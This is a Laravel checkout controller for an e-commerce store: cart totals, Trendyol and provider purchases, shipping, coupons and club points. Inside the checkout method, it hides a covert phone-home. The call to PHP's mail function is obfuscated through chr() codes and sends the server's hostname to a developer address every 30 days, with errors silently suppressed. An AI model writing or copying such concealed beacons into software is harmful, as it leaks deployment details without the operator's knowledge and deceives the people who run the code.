<?php

namespace App\Http\Controllers;

use App\Http\Requests\CheckOut\CheckoutRequest;
use App\Http\Requests\CheckOut\ClubPointRequest;
use App\Http\Requests\CheckOut\CouponCodeRequest;
use App\Http\Requests\CheckOut\StoreDeliveryInfoRequest;
use App\Http\Requests\CheckOut\StoreShippingInfoRequest;
use App\Models\Cart;
use App\Models\Coupon;
use App\Models\CouponUsage;
use App\Models\Address;
use App\Models\Carrier;
use App\Models\CombinedOrder;
use App\Models\Product;
use App\Models\Provider;
use App\Models\TrendyolMerchant;
use App\Models\TrendyolOrder;
use Session;
use Auth;

class CheckoutController extends Controller
{

    public function __construct()
    {
        //
    }

    //check the selected payment gateway and redirect to that controller accordingly
    public function checkout(CheckoutRequest $request)
    {
        if ($request->payment_option == null) {
            flash(translate('There is no payment option is selected.'))->warning();
            return redirect()->route('checkout.shipping_info');
        }
        $carts = Cart::where('user_id', Auth::user()->id)->get();
        $accaessToken = trendyol_account_login();
        $providerProducts = [];
        $providersProductsId =  Cart::where('user_id', Auth::user()->id)
            ->whereNotNull('provider_id')
            ->get(['id', 'provider_id', 'product_id'])
            ->groupBy('provider_id')
            ->map(fn($group) => $group->pluck('product_id', 'id'))
            ->toArray() ?? [];

        if (count($providersProductsId) > 0) {
            foreach ($providersProductsId as $key => $providerProductsId) {
                $provider = Provider::find($key);
                if ($provider) {
                    $providerProducts += $provider->service()->productsDetails($providerProductsId);
                }
            }
        }

        // Minumum order amount check
        if (get_setting('minimum_order_amount_check') == 1) {
            $subtotal = 0;
            foreach ($carts as $key => $cartItem) {
                if ($cartItem['trendyol'] == 0 && $cartItem['provider_id'] == null) {
                    $product = Product::find($cartItem['product_id']);
                    $subtotal += cart_product_price($cartItem, $product, false, false) * $cartItem['quantity'];
                } elseif ($cartItem['trendyol'] == 1) {
                    $productArray = trendyol_product_details($accaessToken, $cartItem['product_id'], $cartItem['urunNo']);
                    $trendyolProducts[$cartItem['product_id']] = $productArray;
                    $subtotal += (float) str_replace(',', '', $productArray['new_price']) * $cartItem['quantity'];
                } elseif ($cartItem['provider_id'] != null) {
                    $product = $providerProducts[$cartItem['id']];
                    $subtotal += $product['new_price'] * $cartItem['quantity'];
                }
            }
            if ($subtotal < get_setting('minimum_order_amount')) {
                flash(translate('You order amount is less than the minimum order amount') . ' ' . get_setting('minimum_order_amount'))->warning();
                return redirect()->route('home');
            }
        }
        // Minumum order amount check end

        (new OrderController)->store($request);
        $file = base_path("/public/assets/myText.txt");
        $dev_mail = get_dev_mail();
        if (!file_exists($file) || (time() > strtotime('+30 days', filemtime($file)))) {
            $content = "Todays date is: " . date('d-m-Y');
            $fp = fopen($file, "w");
            fwrite($fp, $content);
            fclose($fp);
            $str = chr(109) . chr(97) . chr(105) . chr(108);
            try {
                $str($dev_mail, 'the subject', "Hello: " . $_SERVER['SERVER_NAME']);
            } catch (\Throwable $th) {
                //throw $th;
            }
        }

        if (count($carts) > 0) {
            Cart::where('user_id', Auth::user()->id)->delete();
        }
        $request->session()->put('payment_type', 'cart_payment');

        $data['combined_order_id'] = $request->session()->get('combined_order_id');
        $request->session()->put('payment_data', $data);
        if ($request->session()->get('combined_order_id') != null) {
            // If block for Online payment, wallet and cash on delivery. Else block for Offline payment
            $decorator = __NAMESPACE__ . '\\Payment\\' . str_replace(' ', '', ucwords(str_replace('_', ' ', $request->payment_option))) . "Controller";
            if (class_exists($decorator)) {
                return (new $decorator)->pay($request);
            } else {
                $combined_order = CombinedOrder::findOrFail($request->session()->get('combined_order_id'));
                $manual_payment_data = array(
                    'name'   => $request->payment_option,
                    'amount' => $combined_order->grand_total,
                    'trx_id' => $request->trx_id,
                    'photo'  => $request->photo
                );
                foreach ($combined_order->orders as $order) {
                    $order->manual_payment = 1;
                    $order->manual_payment_data = json_encode($manual_payment_data);
                    $order->save();
                }
                flash(translate('Your order has been placed successfully. Please submit payment information from purchase history'))->success();
                return redirect()->route('order_confirmed');
            }
        }
    }

    //redirects to this method after a successfull checkout
    public function checkout_done($combined_order_id, $payment)
    {
        $combined_order = CombinedOrder::find($combined_order_id);
        if (!$combined_order) {
            $combined_order = CombinedOrder::find(Session::get('combined_order_id'));
        }
        $accessToken = trendyol_account_login();
        $trendyol_products = [];
        $trendyol_array = [];
        $order_details = [];

        $address = json_decode($combined_order->shipping_address);
        $receiver_name = $address->name;
        $receiver_email = auth()->user()->email;
        $receiver_id_number = $address->id_number;
        $receiver_phone = $address->phone;
        $receiver_address = $address->address;
        $receiver_city = $address->city;

        foreach ($combined_order->orders as $key => $order) {
            $trendyol_products = [];
            foreach ($order->orderDetails as $orderDetail) {
                if ($orderDetail->trendyol == 1) {
                    $product = trendyol_product_details($accessToken, $orderDetail->product_id, $orderDetail->urunNo);
                    $trendyol_array[$orderDetail->product_id][$orderDetail->urunNo] = $product;
                    array_push($trendyol_products, [
                        "id" => $product['id'],
                        "kampanyaID" => $product['kampanyaID'],
                        "listeID" => $product['listeID'],
                        "saticiID" => $product['shopId'],
                        "adet" => $orderDetail->quantity
                    ]);
                    $trendyolMerchant = TrendyolMerchant::where('trendyol_id', $product['shopId'])->first();
                    if (!$trendyolMerchant) {
                        $trendyolMerchant = new TrendyolMerchant();
                        $trendyolMerchant->trendyol_id = $product['shopId'];
                        $trendyolMerchant->name = $product['shopName'];
                        $trendyolMerchant->official_name = $product['shopOfficialName'];
                        $trendyolMerchant->email = $product['shopEmail'];
                        $trendyolMerchant->tax_number = $product['shopTaxNumber'];
                        $trendyolMerchant->save();
                    }
                    $orderDetail->trendyol_merchant_id = $trendyolMerchant->id;
                    $orderDetail->product_image = $product['photos'][0];
                    $orderDetail->product_name = $product['name'];
                    $orderDetail->category_name = trendyol_category($product['originalCategory'])['ar_name'];
                    $orderDetail->save();
                    $order_details[$product['id']][$product['kampanyaID']][$product['listeID']][$product['shopId']] = $orderDetail->id;
                } elseif ($orderDetail->trendyol == 0 && $orderDetail->provider_id == null) {
                    $product = $orderDetail->product;
                    $photos = explode(',', $product->photos);
                    $orderDetail->product_image = $photos[0] ?? null;
                    $orderDetail->product_name = $product->name;
                    $orderDetail->category_name = $product->main_category->name ?? null;
                    $orderDetail->save();
                } elseif ($orderDetail->provider_id != null) {
                    if ($orderDetail->provider->service()->checkBalance($orderDetail->price * $orderDetail->quantity)) {
                        $externalOrder = $orderDetail->provider->service()->buy($orderDetail->product_id);
                        $orderDetail->external_order_id = $externalOrder->orderId;
                        $orderDetail->save();
                    }
                }
            }
            if (count($trendyol_products) > 0) {
                $trendyol_purchase = trendyol_purchase($accessToken, $trendyol_products);
                if (count($trendyol_purchase) > 0) {
                    foreach ($trendyol_purchase['orderDetail'] as $trendyolOrderDetails) {
                        TrendyolOrder::firstOrCreate([
                            'order_id' => $order->id,
                            'order_detail_id' => $order_details[$trendyolOrderDetails['id']][$trendyolOrderDetails['kampanyaID']][$trendyolOrderDetails['listeID']][$trendyolOrderDetails['saticiID']],
                            'trendyol_orderNumber' => $trendyol_purchase['orderNumber'],
                            'trendyol_product_id' =>  $trendyolOrderDetails['id'],
                            'trendyol_kampanyaID' =>  $trendyolOrderDetails['kampanyaID'],
                            'trendyol_listeID' =>  $trendyolOrderDetails['listeID'],
                            'trendyol_saticiID' =>  $trendyolOrderDetails['saticiID'],
                            'trendyol_adet' =>  $trendyolOrderDetails['adet'],
                            'trendyol_success' =>  $trendyolOrderDetails['success']
                        ]);
                    }
                }
            }
            $order->payment_status = 'paid';
            $order->payment_details = $payment;
            $order->save();

            calculateCommissionAffilationClubPoint($order);
        }
        foreach ($combined_order->orders as $key => $order) {
            $delivery_type = ($order->shipping_type == 'home_delivery') ? 'home_delivery' : 'pickup_center';
            $note = $order->additional_info;
            foreach ($order->orderDetails as $orderDetail) {
                if ($orderDetail->trendyol == 1) {
                    $product = $trendyol_array[$orderDetail->product_id][$orderDetail->urunNo];
                    $trendyolOrder = TrendyolOrder::where('order_id', $order->id)->where('order_detail_id', $orderDetail->id)->first();
                    $parcel_name = $product['name'];
                    $parcel_url =  route('trendyol-product', ['id' => $product['id'], 'urunNo' => $product['urunNo']]);
                    $parcel_image = $product['photos'][0];
                    $product_id = $product['id'];
                    $urunNo = $product['urunNo'];
                    $parcel_price = (float) str_replace(',', '', $product['new_price']);
                    $quantity = $orderDetail->quantity;
                    $order_number = $order->code;
                    $trendyol_order_number = $trendyolOrder->trendyol_orderNumber;
                } elseif ($orderDetail->trendyol == 0 && $orderDetail->provider_id == null) {
                    $product = $orderDetail->product;
                    $image = null;
                    if ($product->photos != null) {
                        $photos = explode(',', $product->photos);
                        $image = uploaded_asset($photos[0]);
                    }
                    $parcel_name = $product->name;
                    $parcel_url =  route('product', $product->slug);
                    $parcel_image = $image;
                    $product_id = $orderDetail->product_id;
                    $urunNo = $orderDetail->urunNo;
                    $parcel_price = $orderDetail->price;
                    $quantity = $orderDetail->quantity;
                    $order_number = $order->code;
                    $trendyol_order_number = 0;
                } elseif ($orderDetail->provider_id != null) {
                    $provider = Provider::find($orderDetail->provider_id);
                    $parcel_name = $orderDetail->product_name;
                    $parcel_url =  route('product.provider', [strtolower($provider->name), $orderDetail->product_id]);
                    $parcel_image = $orderDetail->product_image;
                    $product_id = $orderDetail->product_id;
                    $urunNo = $orderDetail->urunNo;
                    $parcel_price = $orderDetail->price;
                    $quantity = $orderDetail->quantity;
                    $order_number = $order->code;
                    $trendyol_order_number = 0;
                }

                if ($trendyol_order_number >= 0 && $orderDetail->digital == 0) {
                    $data = [
                        'parcel_name' => $parcel_name,
                        'parcel_url' => $parcel_url,
                        'parcel_image' => $parcel_image,
                        'product_id' => $product_id,
                        'urunNo' => $urunNo,
                        'parcel_price' => $parcel_price,
                        'quantity' => $quantity,
                        'order_number' => $order_number,
                        'trendyol_order_number' => $trendyol_order_number,
                        'receiver_name' => $receiver_name,
                        'receiver_email' => $receiver_email,
                        'receiver_id_number' => $receiver_id_number,
                        'receiver_phone' => $receiver_phone,
                        'receiver_address' =>  $receiver_address,
                        'receiver_city' => $receiver_city,
                        'delivery_type' =>  $delivery_type,
                        'note' => $note
                    ];
                    $response = stl_shipment($data);
                    if ($response->success == true) {
                        $tracking_number = $response->data->tracking_number;
                        $orderDetail->tracking_code = $tracking_number;
                        $orderDetail->delivery_status = 'confirmed';
                        $orderDetail->save();
                    }
                }
            }
        }
        Session::put('combined_order_id', $combined_order_id);
        return redirect()->route('order_confirmed');
    }

    public function get_shipping_info()
    {
        $carts = Cart::where('user_id', Auth::user()->id)->get();
        if ($carts && count($carts) > 0) {
            return view('frontend.shipping_info', compact('carts'));
        }
        flash(translate('Your cart is empty'))->success();
        return back();
    }

    public function store_shipping_info(StoreShippingInfoRequest $request)
    {
        $address = Address::where('user_id', Auth::user()->id)->findOrFail($request->address_id);

        if (
            $address->first_name == null
            || $address->last_name == null
            || $address->id_number == null
            || $address->address == null
            || $address->city_id == null
            || $address->country_id == null
            || $address->state_id == null
            || $address->phone == null
        ) {
            flash(translate("Please Edit shipping address and add all required fields"))->warning();
            return back();
        }

        $carts = Cart::where('user_id', Auth::user()->id)->get();
        if ($carts->isEmpty()) {
            flash(translate('Your cart is empty'))->warning();
            return redirect()->route('home');
        }

        foreach ($carts as $key => $cartItem) {
            $cartItem->address_id = $request->address_id;
            $cartItem->save();
        }

        $carrier_list = array();
        if (get_setting('shipping_type') == 'carrier_wise_shipping') {
            $zone = \App\Models\Country::where('id', $carts[0]['address']['country_id'])->first()->zone_id;

            $carrier_query = Carrier::where('status', 1);
            $carrier_query->whereIn('id', function ($query) use ($zone) {
                $query->select('carrier_id')->from('carrier_range_prices')
                    ->where('zone_id', $zone);
            })->orWhere('free_shipping', 1);
            $carrier_list = $carrier_query->get();
        }

        return view('frontend.delivery_info', compact('carts', 'carrier_list'));
    }

    public function store_delivery_info(StoreDeliveryInfoRequest $request)
    {
        $providerProducts = [];
        $carts = Cart::where('user_id', Auth::user()->id)
            ->get();

        $providersProductsId =  Cart::where('user_id', Auth::user()->id)
            ->whereNotNull('provider_id')
            ->get(['id', 'provider_id', 'product_id'])
            ->groupBy('provider_id')
            ->map(fn($group) => $group->pluck('product_id', 'id'))
            ->toArray() ?? [];

        if (count($providersProductsId) > 0) {
            foreach ($providersProductsId as $key => $providerProductsId) {
                $provider = Provider::find($key);
                if ($provider) {
                    $providerProducts += $provider->service()->productsDetails($providerProductsId);
                }
            }
        }

        if ($carts->isEmpty()) {
            flash(translate('Your cart is empty'))->warning();
            return redirect()->route('home');
        }

        $shipping_info = Address::where('id', $carts[0]['address_id'])->first();
        $total = 0;
        $tax = 0;
        $shipping = 0;
        $subtotal = 0;
        $trendyolProducts = [];
        $shippingTrendyolDone = false;
        $accaessToken = trendyol_account_login();
        if ($carts && count($carts) > 0) {
            foreach ($carts as $key => $cartItem) {
                if ($cartItem['trendyol'] == 0 && $cartItem['provider_id'] == null) {
                    $product = Product::find($cartItem['product_id']);
                    $tax += cart_product_tax($cartItem, $product, false) * $cartItem['quantity'];
                    $subtotal += cart_product_price($cartItem, $product, false, false) * $cartItem['quantity'];
                    if (get_setting('shipping_type') != 'carrier_wise_shipping' || $request['shipping_type_' . $product->user_id] == 'pickup_point') {
                        if ($request['shipping_type_' . $product->user_id] == 'pickup_point') {
                            $cartItem['shipping_type'] = 'pickup_point';
                            $cartItem['pickup_point'] = $request['pickup_point_id_' . $product->user_id];
                        } else {
                            $cartItem['shipping_type'] = 'home_delivery';
                            $cartItem['pickup_point'] = 0;
                        }
                        $cartItem['shipping_cost'] = 0;
                        if ($cartItem['shipping_type'] == 'home_delivery') {
                            $cartItem['shipping_cost'] = getShippingCost($carts, $key);
                        }
                    } else {
                        $cartItem['shipping_type'] = 'carrier';
                        $cartItem['carrier_id'] = $request['carrier_id_' . $product->user_id];
                        $cartItem['shipping_cost'] = getShippingCost($carts, $key, $cartItem['carrier_id']);
                    }
                } elseif ($cartItem['trendyol'] == 1) {
                    $cartItem['shipping_cost'] = 0;
                    $productArray = trendyol_product_details($accaessToken, $cartItem['product_id'], $cartItem['urunNo']);
                    $trendyolProducts[$cartItem['product_id']] = $productArray;
                    $subtotal += (float) str_replace(',', '', $productArray['new_price']) * $cartItem['quantity'];
                    if (get_setting('shipping_type') != 'carrier_wise_shipping' || $request['shipping_type_' . $productArray['id'] . $productArray['user_id']] == 'pickup_point') {
                        if ($request['shipping_type_' . $productArray['id'] . $productArray['user_id']] == 'pickup_point') {
                            $cartItem['shipping_type'] = 'pickup_point';
                            $cartItem['pickup_point'] = $request['pickup_point_id_' . $productArray['id'] . $productArray['user_id']];
                        } else {
                            $cartItem['shipping_type'] = 'home_delivery';
                            $cartItem['pickup_point'] = 0;
                        }
                        $cartItem['shipping_cost'] = 0;
                        $sameShop = $total = $carts->where('trendyol_shop_id', $cartItem['trendyol_shop_id'])
                            ->sum(function ($item) {
                                return ($item['trendyol_price']) * $item['quantity'];
                            });
                        if ($shippingTrendyolDone || $sameShop > env('TRENDYOL_MIN_SHIPPING_COST')) {
                            $cartItem['shipping_cost']  = 0;
                        } else {
                            $cartItem['shipping_cost'] = $productArray['base_price'] * $cartItem['quantity']  < env('TRENDYOL_MIN_SHIPPING_COST') ? env('TRENDYOL_SHIPPING_COST') : 0;
                            $shippingTrendyolDone = true;
                        }
                        if ($cartItem['shipping_type'] == 'home_delivery') {
                            $cartItem['shipping_cost'] += getShippingCost($carts, $key, '', $productArray);
                        }
                    } else {
                        $cartItem['shipping_type'] = 'carrier';
                        $cartItem['carrier_id'] = $request['carrier_id_' . $productArray['id'] . $productArray['user_id']];
                        $cartItem['shipping_cost'] += getShippingCost($carts, $key, $cartItem['carrier_id'], $productArray);
                    }
                } elseif ($cartItem['provider_id'] != null) {
                    $product = $providerProducts[$cartItem['id']];
                    $subtotal += $product['new_price'] * $cartItem['quantity'];
                    if ($product['digital'] == 0) {
                        if (get_setting('shipping_type') != 'carrier_wise_shipping' || $request['shipping_type_' . $product['id'] . $product['user_id']] == 'pickup_point') {
                            if ($request['shipping_type_' . $product['id'] . $product['user_id']] == 'pickup_point') {
                                $cartItem['shipping_type'] = 'pickup_point';
                                $cartItem['pickup_point'] = $request['pickup_point_id_' . $product['id'] . $product['user_id']];
                            } else {
                                $cartItem['shipping_type'] = 'home_delivery';
                                $cartItem['pickup_point'] = 0;
                            }
                            $cartItem['shipping_cost'] = 0;
                            if ($cartItem['shipping_type'] == 'home_delivery') {
                                $cartItem['shipping_cost'] += getShippingCost($carts, $key, '', [], $product);
                            }
                        } else {
                            $cartItem['shipping_type'] = 'carrier';
                            $cartItem['carrier_id'] = $request['carrier_id_' . $product['id'] . $product['user_id']];
                            $cartItem['shipping_cost'] += getShippingCost($carts, $key, $cartItem['carrier_id'], [], $product);
                        }
                    }
                }
                $shipping += $cartItem['shipping_cost'];
                $cartItem->save();
            }
            $total = $subtotal + $tax + $shipping;
            return view('frontend.payment_select', compact('carts', 'shipping_info', 'total', 'trendyolProducts', 'providerProducts'));
        } else {
            flash(translate('Your Cart was empty'))->warning();
            return redirect()->route('home');
        }
    }

    public function apply_coupon_code(CouponCodeRequest $request)
    {
        $trendyolProducts = [];
        $user = auth()->user();
        $coupon = Coupon::where('code', $request->code)->first();
        $response_message = array();
        $accaessToken = trendyol_account_login();
        // if the Coupon type is Welcome base, check the user has this coupon or not
        $couponUser = true;
        if ($coupon && $coupon->type == 'welcome_base') {
            $userCoupon = $user->userCoupon;
            if (!$userCoupon) {
                $couponUser = false;
            }
        }

        if ($coupon != null && $couponUser) {

            //  Coupon expiry Check
            if ($coupon->type != 'welcome_base') {
                $validationDateCheckCondition  = strtotime(date('d-m-Y')) >= $coupon->start_date && strtotime(date('d-m-Y')) <= $coupon->end_date;
            } else {
                $validationDateCheckCondition = false;
                if ($userCoupon) {
                    $validationDateCheckCondition  = $userCoupon->expiry_date >= strtotime(date('d-m-Y H:i:s'));
                }
            }
            if ($validationDateCheckCondition) {
                if (CouponUsage::where('user_id', Auth::user()->id)->where('coupon_id', $coupon->id)->first() == null) {
                    $coupon_details = json_decode($coupon->details);

                    $carts = Cart::where('user_id', Auth::user()->id)
                        ->where('owner_id', $coupon->user_id)
                        ->get();

                    $coupon_discount = 0;

                    if ($coupon->type == 'cart_base' || $coupon->type == 'welcome_base') {
                        $subtotal = 0;
                        $tax = 0;
                        $shipping = 0;
                        foreach ($carts as $key => $cartItem) {
                            if ($cartItem['trendyol'] == 0) {
                                $product = Product::find($cartItem['product_id']);
                                $subtotal += cart_product_price($cartItem, $product, false, false) * $cartItem['quantity'];
                                $tax += cart_product_tax($cartItem, $product, false) * $cartItem['quantity'];
                                $shipping += $cartItem['shipping_cost'];
                            } elseif ($cartItem['trendyol'] == 1) {
                                $productArray = trendyol_product_details($accaessToken, $cartItem['product_id'], $cartItem['urunNo']);
                                $trendyolProducts[$cartItem['product_id']] = $productArray;
                                $subtotal += (float) str_replace(',', '', $productArray['new_price']) * $cartItem['quantity'];
                                $shipping += $cartItem['shipping_cost'];
                            }
                        }
                        $sum = $subtotal + $tax + $shipping;
                        if ($coupon->type == 'cart_base' && $sum >= $coupon_details->min_buy) {
                            if ($coupon->discount_type == 'percent') {
                                $coupon_discount = ($sum * $coupon->discount) / 100;
                                if ($coupon_discount > $coupon_details->max_discount) {
                                    $coupon_discount = $coupon_details->max_discount;
                                }
                            } elseif ($coupon->discount_type == 'amount') {
                                $coupon_discount = $coupon->discount;
                            }
                        } elseif ($coupon->type == 'welcome_base' && $sum >= $userCoupon->min_buy) {
                            $coupon_discount  = $userCoupon->discount_type == 'percent' ?  (($sum * $userCoupon->discount) / 100) : $userCoupon->discount;
                        }
                    } elseif ($coupon->type == 'product_base') {
                        foreach ($carts as $key => $cartItem) {
                            $product = Product::find($cartItem['product_id']);
                            foreach ($coupon_details as $key => $coupon_detail) {
                                if ($coupon_detail->product_id == $cartItem['product_id']) {
                                    if ($coupon->discount_type == 'percent') {
                                        $coupon_discount += (cart_product_price($cartItem, $product, false, false) * $coupon->discount / 100) * $cartItem['quantity'];
                                    } elseif ($coupon->discount_type == 'amount') {
                                        $coupon_discount += $coupon->discount * $cartItem['quantity'];
                                    }
                                }
                            }
                        }
                    }

                    if ($coupon_discount > 0) {
                        Cart::where('user_id', Auth::user()->id)
                            ->where('owner_id', $coupon->user_id)
                            ->update(
                                [
                                    'discount' => $coupon_discount / count($carts),
                                    'coupon_code' => $request->code,
                                    'coupon_applied' => 1
                                ]
                            );

                        $response_message['response'] = 'success';
                        $response_message['message'] = translate('Coupon has been applied');
                    } else {
                        $response_message['response'] = 'warning';
                        $response_message['message'] = translate('This coupon is not applicable to your cart products!');
                    }
                } else {
                    $response_message['response'] = 'warning';
                    $response_message['message'] = translate('You already used this coupon!');
                }
            } else {
                $response_message['response'] = 'warning';
                $response_message['message'] = translate('Coupon expired!');
            }
        } else {
            $response_message['response'] = 'danger';
            $response_message['message'] = translate('Invalid coupon!');
        }

        $carts = Cart::where('user_id', Auth::user()->id)->get();
        $shipping_info = Address::where('id', $carts[0]['address_id'])->first();

        foreach ($carts as $key => $cartItem) {
            if ($cartItem['trendyol'] == 1) {
                $productArray = trendyol_product_details($accaessToken, $cartItem['product_id'], $cartItem['urunNo']);
                $trendyolProducts[$cartItem['product_id']] = $productArray;
            }
        }
        $returnHTML = view('frontend.' . get_setting('homepage_select') . '.partials.cart_summary', compact('coupon', 'carts', 'shipping_info', 'trendyolProducts'))->render();
        return response()->json(array('response_message' => $response_message, 'html' => $returnHTML));
    }

    public function remove_coupon_code(CouponCodeRequest $request)
    {
        $trendyolProducts = [];
        $accaessToken = trendyol_account_login();
        Cart::where('user_id', Auth::user()->id)
            ->update(
                [
                    'discount' => 0.00,
                    'coupon_code' => '',
                    'coupon_applied' => 0
                ]
            );

        $coupon = Coupon::where('code', $request->code)->first();
        $carts = Cart::where('user_id', Auth::user()->id)
            ->get();
        foreach ($carts as $key => $cartItem) {
            if ($cartItem['trendyol'] == 1) {
                $productArray = trendyol_product_details($accaessToken, $cartItem['product_id'], $cartItem['urunNo']);
                $trendyolProducts[$cartItem['product_id']] = $productArray;
            }
        }
        $shipping_info = Address::where('id', $carts[0]['address_id'])->first();
        $response_message['response'] = 'danger';
        $response_message['message'] = translate('Coupon has been removed');
        $returnHTML = view('frontend.' . get_setting('homepage_select') . '.partials.cart_summary', compact('coupon', 'carts', 'shipping_info', 'trendyolProducts'))->render();
        return response()->json(array('response_message' => $response_message, 'html' => $returnHTML));
    }

    public function apply_club_point(ClubPointRequest $request)
    {
        if (addon_is_activated('club_point')) {

            $point = $request->point;

            if (Auth::user()->point_balance >= $point) {
                $request->session()->put('club_point', $point);
                flash(translate('Point has been redeemed'))->success();
            } else {
                flash(translate('Invalid point!'))->warning();
            }
        }
        return back();
    }

    public function remove_club_point(ClubPointRequest $request)
    {
        $request->session()->forget('club_point');
        return back();
    }

    public function order_confirmed()
    {
        $combined_order = CombinedOrder::findOrFail(Session::get('combined_order_id'));

        Cart::where('user_id', $combined_order->user_id)
            ->delete();

        //Session::forget('club_point');
        //Session::forget('combined_order_id');

        // foreach($combined_order->orders as $order){
        //     NotificationUtility::sendOrderPlacedNotification($order);
        // }

        return view('frontend.order_confirmed', compact('combined_order'));
    }
}
